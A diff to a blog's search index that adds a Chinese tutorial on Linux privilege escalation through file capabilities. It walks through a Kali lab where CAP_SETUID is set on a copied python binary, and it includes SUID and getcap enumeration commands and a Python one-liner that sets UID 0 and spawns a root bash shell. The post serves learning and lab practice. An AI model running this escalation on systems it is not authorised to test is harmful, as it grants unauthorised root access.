@@ -3,6 +3,21 @@
   
     
     <entry>
+      <title>setcap设置的文件可控造成的提权</title>
+      <link href="/posts/9dcc308e.html"/>
+      <url>/posts/9dcc308e.html</url>
+      <content type="html"><![CDATA[<h2 id="0x01-SUID"><a href="#0x01-SUID" class="headerlink" title="0x01 SUID"></a>0x01 SUID</h2><p>能力介绍<br>Linux中的功能是什么</p><p>在获得功能之前，我们只有特权和非特权进程的二进制系统，并且出于执行权限检查的目的，传统的UNIX实现将进程分为两类：特权进程（称为超级用户或根）和非特权进程（其有效UID为非零）。</p><p>功能是将内核用户或内核级程序的特权分成小块的那些权限，以便可以使进程有足够的能力执行特定的特权任务。</p><p>功能和SUID之间的区别</p><p>SUID： SUID代表设置的用户ID，并允许用户以文件所有者的身份执行文件。这被定义为授予用户临时权限，使其在文件所有者（而不是运行文件所有者）的权限下运行程序/文件。使用“查找”命令可以很容易地检测到。要查找在当前目录中设置了SUID的所有文件，我们可以使用-perm选项，该选项将仅打印许可权设置为4000的文件（允许进程临时使用root的权限执行）</p><p>给予某个文件拥有临时权限的命令<br>例子：</p><pre><code>chmod u+s /usr/bin/python</code></pre><p>使用find命令可以找出SUID文件</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p><img src="https://s2.ax1x.com/2019/12/01/Qmmes0.png" alt="Qmmes0.png"></p><h2 id="0x02-牛刀小试"><a href="#0x02-牛刀小试" class="headerlink" title="0x02 牛刀小试"></a>0x02 牛刀小试</h2><p>setcap详解：<a href="https://www.cnblogs.com/nf01/articles/10418141.html" target="_blank" rel="noopener">setcap详解 - 农夫运维 - 博客园</a><br>setcap简要说明：</p><pre><code> Capabilities的主要思想在于分割root用户的特权，即将root的特权分割成不同的能力，每种能力代表一定的特权操作。例如：能力CAP_SYS_MODULE表示用户能够加载(或卸载)内核模块的特权操作，而CAP_SETUID表示用户能够修改进程用户身份的特权操作。在Capbilities中系统将根据进程拥有的能力来进行特权操作的访问控制。</code></pre><p>getcap：检索setcap所设置的文件</p><pre><code>getcap -r  / 2&gt;/dev/null</code></pre><p><img src="https://s2.ax1x.com/2019/12/01/QmnH9H.png" alt="QmnH9H.png"></p><h2 id="0x03实验"><a href="#0x03实验" class="headerlink" title="0x03实验"></a>0x03实验</h2><pre><code>OS：kali测试用户：root、test</code></pre><p>先用root用户给予python SUID</p><pre><code>chmod u+s /usr/bin/python</code></pre><p>查找一波对应的SUID权限的文件,确定是否给予成功</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p><img src="https://s2.ax1x.com/2019/12/01/Qm1t9U.png" alt="Qm1t9U.png"></p><p>复制python到/tmp目录下，拟态和文章类似的构造</p><pre><code>cp /usr/bin/python</code></pre><p><img src="https://s2.ax1x.com/2019/12/01/Qm3OJK.png" alt="Qm3OJK.png"></p><p>setcap给予tmp目录下的python一个用户临时执行权限</p><pre><code>setcap CAP_SETUID+ep /tmp/python</code></pre><p><img src="https://s2.ax1x.com/2019/12/01/Qm8ues.png" alt="Qm8ues.png"></p><p>切换至test用户，执行以下命令即可获取一个root权限</p><pre><code>getcap -r / 2&gt;/dev/null #查询被赋予权限的文件</code></pre><p><img src="https://s2.ax1x.com/2019/12/01/Qm8sSO.png" alt="Qm8sSO.png"></p><pre><code>./python -c &#39;import os;os.setuid(0);os.system(&quot;/bin/bash&quot;)&#39;</code></pre><p><img src="https://s2.ax1x.com/2019/12/01/Qm8hkt.png" alt="Qm8hkt.png"></p><h2 id="0x04结论"><a href="#0x04结论" class="headerlink" title="0x04结论"></a>0x04结论</h2><p>getcap -r / 2&gt;/dev/null #查询被赋予CAP_SETUID权限的文件，来获取某些文件是否有利用的价值。目前得出可以利用用的几个</p><pre><code>perlpythontar</code></pre><h2 id="0x05参考链接"><a href="#0x05参考链接" class="headerlink" title="0x05参考链接"></a>0x05参考链接</h2><p><a href="https://www.hackingarticles.in/" target="_blank" rel="noopener">Hacking Articles - Raj Chandel’s Blog</a><br><a href="http://man7.org/linux/man-pages/man8/getcap.8.html" target="_blank" rel="noopener">getcap(8) - Linux manual page</a><br><a href="https://www.cnblogs.com/nf01/articles/10418141.html" target="_blank" rel="noopener">setcap详解 - 农夫运维 - 博客园</a>  </p>]]></content>
+      
+      
+        <tags>
+            
+            <tag> Linux提权 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
       <title>XXE漏洞学习</title>
       <link href="/posts/8867b076.html"/>
       <url>/posts/8867b076.html</url>
